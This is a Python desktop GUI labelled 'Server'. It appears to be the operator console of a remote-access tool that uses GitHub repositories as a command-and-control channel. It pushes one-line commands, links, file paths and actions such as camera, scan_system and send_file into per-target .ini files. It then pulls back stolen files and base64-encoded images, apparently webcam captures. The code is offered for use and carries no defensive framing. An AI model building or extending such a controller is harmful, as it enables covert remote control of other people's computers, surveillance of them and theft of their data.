from tkinter import *
from customtkinter import *
from os import path , rename , remove , system , getcwd
from CTkMessagebox import CTkMessagebox
from shutil import copy
from PIL import Image
from io import BytesIO
import requests
import base64
import json
import git

def check_condition():
    if user.get() == "":
        window.destroy()
def on_closing():
    check_condition()

def check_user():
    global user_name
    user_name = user.get()
    url = f"https://github.com/ehsanmehran/{user_name}"
    result = requests.get(url).status_code
    if result == 200:
        new_window.destroy()
    else:
        msg = CTkMessagebox(title="ERROR", message="not found",
                            icon="warning", option_1="OK")

def send_main_information(TOKEN, content, name_file_to_site):
    sha = requests.get(f"https://api.github.com/repos/ehsanmehran/{user_name}/contents/{name_file_to_site}",
                       headers={"Authorization": f"token {TOKEN}"}).json()["sha"]
    content_base64 = base64.b64encode(content.encode()).decode()  # Encode content to Base64
    data = {"content": content_base64, "message": "data", "sha": sha}
    data = json.dumps(data)
    main = requests.put(f"https://api.github.com/repos/ehsanmehran/{user_name}/contents/{name_file_to_site}", data=data,
                        headers={"Authorization": f"token {TOKEN}"})

TOKEN = ''
cunter = 0
def segmented_button_callback(value):
    def pack_input_submit():
        global input , submit , cunter , TOKEN
        if cunter == 0:
            input = CTkEntry(window, font=font, justify=CENTER, width=500, height=50, corner_radius=30)
            submit = CTkButton(window, text="Send", font=font)
            input.pack()
            submit.pack(pady=5)
        elif cunter > 0:
            cunter = 0
            input.destroy()
            submit.destroy()
            input = CTkEntry(window, font=font, justify=CENTER, width=500, height=50, corner_radius=30)
            submit = CTkButton(window, text="Send", font=font)
            input.pack()
            submit.pack(pady=5)

    def Send_Information(value):
        font = CTkFont(family="B Nazanin", size=20)
        global input , submit , cunter
        if value == "<back>":
            input.destroy()
            submit.destroy()
            type.configure(values=["Send_Information" ,"Receiv_Information"] , command=segmented_button_callback , font=font)
        if value == "file_path":
            pack_input_submit();cunter += 1
            submit.configure(command=lambda : send_main_information(TOKEN=TOKEN , content=f"path_file = {input.get()}" , name_file_to_site="file_path.ini"))
        if value == "link":
            pack_input_submit();cunter += 1
            submit.configure(command=lambda:send_main_information(TOKEN=TOKEN , content=f"link = '{input.get()}'" , name_file_to_site="link.ini"))
        if value == "one_line_commands":
            pack_input_submit();cunter += 1
            submit.configure(command=lambda: send_main_information(TOKEN=TOKEN, content=f"{input.get()}",name_file_to_site="one_line_commands.ini"))
        if value == "result_condition":
            type.configure(values=["link" ,"one_line_commands" , "camera" , "scan_system" , "send_file" , "False" , "<back>"] , font=CTkFont(family="B Nazanin", size=20) , command=lambda e:(type.configure(values=["Send_Information" ,"Receiv_Information"] , command=segmented_button_callback , font=font) , input.destroy() , submit.destroy())if e == "<back>" else send_main_information(TOKEN=TOKEN , content=f"result_condition = '{e}'" , name_file_to_site="result_condition.ini"))

    def Receiv_Information(value):
        def Rmpydir():
            system(f"rmdir /s /q {user_name}")
        # git.Git().clone("https://github.com/ehsanmehran/python") if not path.exists("python") else ()
        font = CTkFont(family="B Nazanin", size=20)
        if value == "<refresh>":
            git.Git().clone(f"https://github.com/ehsanmehran/{user_name}") if not path.exists(f"{user_name}") else (Rmpydir() , git.Git().clone(f"https://github.com/ehsanmehran/{user_name}"))
        if value == "<back>":
            type.configure(values=["Send_Information", "Receiv_Information"], command=segmented_button_callback , font=font)
        if value == "download_file":
            def convert_ini_to_zip():
                copy(fr"{user_name}\download_file.ini", fr"{getcwd()}")
                rename("download_file.ini", "download_file.zip")
            if not path.exists(f"{user_name}"):
                msg = CTkMessagebox(title="ERROR", message="The desired folder does not exist Do you want to download?",icon="warning", option_1="Yes", option_2="No")
                if msg.get() == "Yes":
                    git.Git().clone(f"https://github.com/ehsanmehran/{user_name}") if not path.exists(f"{user_name}") else (git.Git().clone(f"https://github.com/ehsanmehran/{user_name}"))
                    convert_ini_to_zip()
                elif msg.get() == "No":type.configure(values=["Send_Information", "Receiv_Information"], command=segmented_button_callback , font=font)
            else:
                convert_ini_to_zip()
        if value == "code_image":
            def convert_text_to_image():
                with open(fr'{user_name}/code_image.ini', 'rb') as file:
                    b64_string = file.read()
                img_data = base64.b64decode(b64_string)
                img = Image.open(BytesIO(img_data))
                img.save(fr'{getcwd()}\output.png')
            if not path.exists(f"{user_name}"):
                msg = CTkMessagebox(title="ERROR", message="The desired folder does not exist Do you want to download?",
                                    icon="warning", option_1="Yes", option_2="No")
                if msg.get() == "Yes":
                    git.Git().clone(f"https://github.com/ehsanmehran/{user_name}") if not path.exists(f"{user_name}") else (git.Git().clone(f"https://github.com/ehsanmehran/{user_name}"))
                    convert_text_to_image()
                elif msg.get() == "No":type.configure(values=["Send_Information", "Receiv_Information"], command=segmented_button_callback , font=font)
            else:
                convert_text_to_image()
        if value == "result_condition" or value == "one_line_commands" or value == "link" or value == "file_path" or value == "last_visit":
            def return_message_box(value):
                if value == "result_condition":
                    with open(file=fr"{user_name}\result_condition.ini" , mode="r" , encoding="utf8") as f:
                        return f.read()
                elif value == "one_line_commands":
                    with open(file=fr"{user_name}\one_line_commands.ini" , mode="r" , encoding="utf8") as f:
                        return f.read()
                elif value == "link":
                    with open(file=fr"{user_name}\link.ini" , mode="r" , encoding="utf8") as f:
                        return f.read()
                elif value == "file_path":
                    with open(file=fr"{user_name}\file_path.ini" , mode="r" , encoding="utf8") as f:
                        return f.read()
                elif value == "last_visit":
                    with open(file=fr"{user_name}\last_visit.ini" , mode="r" , encoding="utf8") as f:
                        return f.read()
            if not path.exists(f"{user_name}"):
                msg = CTkMessagebox(title="ERROR", message="The desired folder does not exist Do you want to download?",
                                    icon="warning", option_1="Yes", option_2="No")
                if msg.get() == "Yes":
                    git.Git().clone(f"https://github.com/ehsanmehran/{user_name}") if not path.exists(f"{user_name}") else (git.Git().clone(f"https://github.com/ehsanmehran/{user_name}"))
                    CTkMessagebox(title="INFO", message=f"{return_message_box(value)}",
                                  icon="info", option_1="OK")
                elif msg.get() == "No":type.configure(values=["Send_Information", "Receiv_Information"], command=segmented_button_callback , font=font)
            else:
                CTkMessagebox(title="INFO", message=f"{return_message_box(value)}",
                              icon="info", option_1="OK")

    if value == "Send_Information":
        type.configure(values=["file_path" , "link" , "one_line_commands" , "result_condition" , "<back>"] , font=CTkFont(family="B Nazanin", size=20) , command=Send_Information)

    if value == "Receiv_Information":
        type.configure(values=["last_visit" , "file_path" , "link" , "one_line_commands" , "result_condition" , "code_image" , "download_file" , "<back>" , "<refresh>"] , font=CTkFont(family="B Nazanin", size=20) , command=Receiv_Information)

window = CTk()
font = CTkFont(family="B Nazanin", size=20)
set_default_color_theme("blue")
#new window
new_window = CTkToplevel(window)
new_window.geometry('300x200')
new_window.grab_set()
new_window.resizable(width=False, height=False)
new_window.title("Select User")
select_type = CTkLabel(new_window, text="enter username: " , font=font, anchor=CENTER , justify=CENTER)
select_type.place(x=0,y=10)
user = CTkEntry(new_window, font=font, justify=CENTER, width=300, height=50, corner_radius=30)
submit_check = CTkButton(new_window, text="Send", font=font, command=check_user)
user.place(x=0,y=60)
submit_check.place(x=90,y=130)
new_window.protocol("WM_DELETE_WINDOW", on_closing)
#_____________
switch_1 = CTkSwitch(window, text="darkmode", command=lambda: set_appearance_mode("dark" if switch_1.get() == 1 else "light"))
switch_1.pack(padx=20, pady=20)
window.title("Server")
window.geometry("1050x300")
window.resizable(False, False)


select_type = CTkLabel(window, text=":نوع فعالیت را انتخاب کنید " , font=font, anchor=CENTER , justify=CENTER)
select_type.place(x=830,y=50)

type = CTkSegmentedButton(window , values=[] , font=font , command=segmented_button_callback)
type.configure(values=["Send_Information" ,"Receiv_Information"] , command=segmented_button_callback)
type.pack(pady=20)
type.set("receiv_information")
input = CTkEntry(window , font=font , justify=CENTER , width=500 , height=50 , corner_radius=30)
submit = CTkButton(window , text="Send" , font=font)

window.mainloop()